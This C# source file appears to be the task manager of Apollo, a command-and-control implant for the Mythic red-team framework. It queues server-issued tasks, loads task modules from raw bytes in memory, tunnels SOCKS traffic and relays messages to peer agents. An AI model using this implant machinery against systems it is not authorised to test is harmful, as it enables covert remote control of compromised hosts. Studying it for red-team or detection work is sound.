using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Collections.Concurrent;
using ApolloInterop.Interfaces;
using ApolloInterop.Types.Delegates;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Enums.ApolloEnums;
using ApolloInterop.Classes;
using System.Threading;
using ThreadingTask = System.Threading.Tasks.Task;
using System.Reflection;
using System.Security;
using System.Security.Permissions;
using ApolloInterop.Classes.Collections;

namespace Apollo.Management.Tasks
{
    public class TaskManager : ITaskManager
    {
        protected IAgent _agent;

        private ThreadSafeList<TaskResponse> TaskResponseList = new ThreadSafeList<TaskResponse>();
        private ThreadSafeList<DelegateMessage> DelegateMessages = new ThreadSafeList<DelegateMessage>();
        //private ConcurrentQueue<DelegateMessage> DelegateMessages = new ConcurrentQueue<DelegateMessage>();

        private Dictionary<MessageDirection, ConcurrentQueue<SocksDatagram>> SocksDatagramQueue = new Dictionary<MessageDirection, ConcurrentQueue<SocksDatagram>>()
        {
            { MessageDirection.ToMythic, new ConcurrentQueue<SocksDatagram>() },
            { MessageDirection.FromMythic, new ConcurrentQueue<SocksDatagram>() }
        };

        private ConcurrentDictionary<string, Tasking> _runningTasks = new ConcurrentDictionary<string, Tasking>();

        private ConcurrentDictionary<string, Type> _loadedTaskTypes = new ConcurrentDictionary<string, Type>();

        private ConcurrentQueue<Task> TaskQueue = new ConcurrentQueue<Task>();
        private ConcurrentQueue<TaskStatus> TaskStatusQueue = new ConcurrentQueue<TaskStatus>();
        private Action _taskConsumerAction;
        private ThreadingTask _mainworker;
        private Assembly _tasksAsm = null;

        public TaskManager(IAgent agent)
        {
            _agent = agent;
            InitializeTaskLibrary();
            _taskConsumerAction = () =>
            {
                while(_agent.IsAlive())
                {
                    if (TaskQueue.TryDequeue(out Task result))
                    {
                        if (!_loadedTaskTypes.ContainsKey(result.Command))
                        {
                            AddTaskResponseToQueue(new TaskResponse()
                            {
                                UserOutput = $"Task '{result.Command}' not loaded.",
                                TaskID = result.ID,
                                Completed = true,
                                Status = "error"
                            });
                        }
                        else
                        {
                            try
                            {
                                Tasking t = (Tasking) Activator.CreateInstance(
                                    _loadedTaskTypes[result.Command],
                                    new object[] {_agent, result});
                                var taskObj = t.CreateTasking();
                                // When the task finishes, we remove it from the queue.
                                taskObj.ContinueWith((_) => { _runningTasks.TryRemove(t.ID(), out Tasking _); });
                                // Unhandled exception occurred in task, report it.
                                taskObj.ContinueWith((_) => { OnTaskErrorOrCancel(t, taskObj); },
                                    System.Threading.Tasks.TaskContinuationOptions.OnlyOnFaulted);
                                // If it got cancelled and threw an exception of that type,
                                // report it.
                                taskObj.ContinueWith((_) => { OnTaskErrorOrCancel(t, taskObj); },
                                    System.Threading.Tasks.TaskContinuationOptions.OnlyOnCanceled);
                                _runningTasks.TryAdd(t.ID(), t);
                                taskObj.Start();
                            }
                            catch (Exception ex)
                            {
                                AddTaskResponseToQueue(new TaskResponse()
                                {
                                    UserOutput = $"Unexpected error during create and execute: {ex.Message}\n{ex.StackTrace}",
                                    TaskID = result.ID,
                                    Completed = true,
                                    Status = "error"
                                });
                            }
                        }

                    }
                }
            };
            _mainworker = new ThreadingTask(_taskConsumerAction);
            _mainworker.Start();
        }

        private void InitializeTaskLibrary()
        {
            // Annoying note - if there's an assembly in the Tasks DLL that isn't in the Apollo
            // reference assemblies, then you'll run into loading errors.
            _tasksAsm = Assembly.Load("Tasks, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
            if (_tasksAsm == null)
            {
                throw new Exception("Could not find loaded tasks assembly.");
            }
            foreach(Type t in _tasksAsm.GetTypes())
            {
                if (t.FullName.StartsWith("Tasks.") &&
                    t.IsPublic &&
                    t.IsClass &&
                    t.IsVisible)
                {
                    string commandName = t.FullName.Split('.')[1];
                    _loadedTaskTypes[commandName] = t;
                }
            }
        }

        public bool LoadTaskModule(byte[] taskAsm, string[] commands)
        {
            bool bRet = false;
            
            Assembly taskingAsm = Assembly.Load(taskAsm);
            Dictionary<string, Type> foundCmds = new Dictionary<string, Type>();
            foreach(Type t in taskingAsm.GetExportedTypes())
            {
                if (commands.Contains(t.Name))
                {
                    foundCmds[t.Name] = t;
                }
            }
            if (foundCmds.Keys.Count != commands.Length)
            {
                bRet = false;
            }
            else
            {
                foreach(string k in foundCmds.Keys)
                {
                    _loadedTaskTypes[k] = foundCmds[k];
                }
                bRet = true;
            }

            return bRet;
        }

        private void OnTaskErrorOrCancel(Tasking t, System.Threading.Tasks.Task taskObj)
        {
            string aggregateError = "";
            if (taskObj.Exception != null)
            {
                foreach (Exception e in taskObj.Exception.InnerExceptions)
                {
                    aggregateError += $"Unhandled exception: {e}\n\n";
                }
            } else if (taskObj.IsCanceled)
            {
                aggregateError = "Task cancelled.";
            }
            else
            {
                aggregateError = "Unhandled and unknown error occured.";
            }
            var msg = t.CreateTaskResponse(aggregateError, true, "error");
            AddTaskResponseToQueue(msg);
        }

        public void AddTaskResponseToQueue(TaskResponse message)
        {
            TaskResponseList.Add(message);
        }

        public void AddDelegateMessageToQueue(DelegateMessage delegateMessage)
        {
            DelegateMessages.Add(delegateMessage);
        }

        public void AddSocksDatagramToQueue(MessageDirection direction, SocksDatagram dg)
        {
            SocksDatagramQueue[direction].Enqueue(dg);
        }


        public bool ProcessMessageResponse(MessageResponse resp)
        {
            if (resp.SocksDatagrams != null)
            {
                System.Threading.Tasks.Parallel.ForEach(resp.SocksDatagrams, (SocksDatagram dg) =>
                {
                    _agent.GetSocksManager().Route(dg);
                });
            }

            if (resp.Tasks != null && resp.Tasks.Length > 0)
            {
                foreach(Task t in resp.Tasks)
                {
                    TaskQueue.Enqueue(t);
                }
            }
            if (resp.Responses != null && resp.Responses.Length > 0)
            {
                foreach(TaskStatus t in resp.Responses)
                {
                    if (_agent.GetFileManager().GetPendingTransfers().Contains(t.ApolloTrackerUUID))
                    {
                        _agent.GetFileManager().ProcessResponse(t);
                    }
                }
            }
            if (resp.Delegates != null && resp.Delegates.Length > 0)
            {
                foreach(DelegateMessage d in resp.Delegates)
                {
                    _agent.GetPeerManager().Route(d);
                }
            }

            return true;
        }

        public bool CreateTaskingMessage(OnResponse<TaskingMessage> onResponse)
        {
            // We should pop messages from the task manager and stuff them into
            // this message here.

            //List<TaskResponse> responses = new List<TaskResponse>();
            //List<DelegateMessage> delegates = new List<DelegateMessage>();
            List<SocksDatagram> dgs = new List<SocksDatagram>();

            //while(TaskResponseQueue.TryDequeue(out TaskResponse res))
            //{
            //    responses.Add(res);
            //}

            //while(DelegateMessages.TryDequeue(out var res))
            //{
            //    delegates.Add(res);
            //}

            while(SocksDatagramQueue[MessageDirection.ToMythic].TryDequeue(out var dg))
            {
                dgs.Add(dg);
            }

            TaskingMessage msg = new TaskingMessage()
            {
                Action = MessageAction.GetTasking.ToString(),
                TaskingSize = -1,
                Delegates = DelegateMessages.Flush(),
                Responses = TaskResponseList.Flush(),
                Socks = dgs.ToArray()
            };
            return onResponse(msg);
        }

        public string[] GetExecutingTaskIds()
        {
            return _runningTasks.Keys.ToArray();
        }

        public bool CancelTask(string taskId)
        {
            if (_runningTasks.TryGetValue(taskId, out Tasking t))
            {
                try
                {
                    t.Kill();
                    return true;
                } catch
                {
                    return false;
                }
            } else
            {
                return false;
            }
        }
    }
}
